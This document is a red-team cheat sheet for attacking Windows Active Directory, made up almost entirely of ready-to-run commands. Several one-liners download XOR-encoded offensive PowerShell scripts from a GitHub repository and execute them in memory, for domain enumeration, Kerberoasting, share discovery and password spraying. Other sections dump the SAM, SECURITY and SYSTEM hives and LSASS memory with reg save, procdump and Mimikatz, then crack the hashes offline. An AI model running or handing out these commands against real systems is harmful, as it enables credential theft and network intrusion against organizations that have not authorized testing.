# Proxy in PowerShell
```
$Proxy=New-object System.Net.WebProxy
$WebSession=new-object Microsoft.PowerShell.Commands.WebRequestSession
$WebSession.Proxy=$Proxy
Invoke-WebRequest -Method Get -Uri "https://www.google.com" -WebSession $WebSession
```

# Encoded Payloads (jdk-tools)
Useful ones:
* PowerUp-v2.ps1-xorencoded.ps1
* Invoke-SharpHound.ps1-xorencoded.ps1
* Invoke-Responder.ps1-xorencoded.ps1
* sharefinder.ps1


# With access to an account, collect the domain info:
```
IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/undergroundbiscuitclub/jdk-tools/master/encoded/Invoke-SharpHound.ps1-xorencoded.ps1'); Invoke-BloodHound -CollectionMethod All
```
This can then be imported into Bloodhound. You can use the below custom queries to also help:
`wget https://raw.githubusercontent.com/hausec/Bloodhound-Custom-Queries/master/customqueries.json -o ~/.config/bloodhound/customqueries.json`


# Enum AD
`%SystemRoot%\system32\dsa.msc`


# Kerberoastable Accounts
`IEX(New-Object Net.WebClient).downloadString('https://github.com/undergroundbiscuitclub/jdk-tools/blob/master/encoded/Invoke-Kerberoast.ps1-xorencoded.ps1')`


# Share Enum
`IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/undergroundbiscuitclub/jdk-tools/master/encoded/sharefinder.ps1') | tee -append shares.txt`


# WinRM Sessions

Connect
`enter-pssession -computername HOSTNAMEHERE`

Disconnect
`exit-pssession`

Enter with different credentials
```
$cred = get-credential
enter-pssession -computername HOSTNAMEHERE -credential $cred
```

# Password Sprarying
```
IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/undergroundbiscuitclub/jdk-tools/master/encoded/Invoke-DomainPasswordSpray.ps1-xorencoded.ps1')
Invoke-DomainPasswordSpray -Password Password123!
```

# Check Password Policy then spray once, wait an hour, then try the next

# Dump LSA and LSASS

If you can run as SYSTEM use:
```
reg save hklm\system system.save
reg save hklm\sam sam.save
reg save hklm\security security.save
```

Then use impacket:
`python3 secretsdump.py -security security.save -system system.save -sam sam.save LOCAL`

Using ProcDump from sysinternals
`procdump -ma lsass.exe lsass.dmp`
You can also use TaskMan to create a dump of lsass.exe
Then use Mimikatz to parse
```
sekurlsa::minidump DUMPFILENAME
sekurlsa::LogonPasswords
```
Crack with hascat -m 1000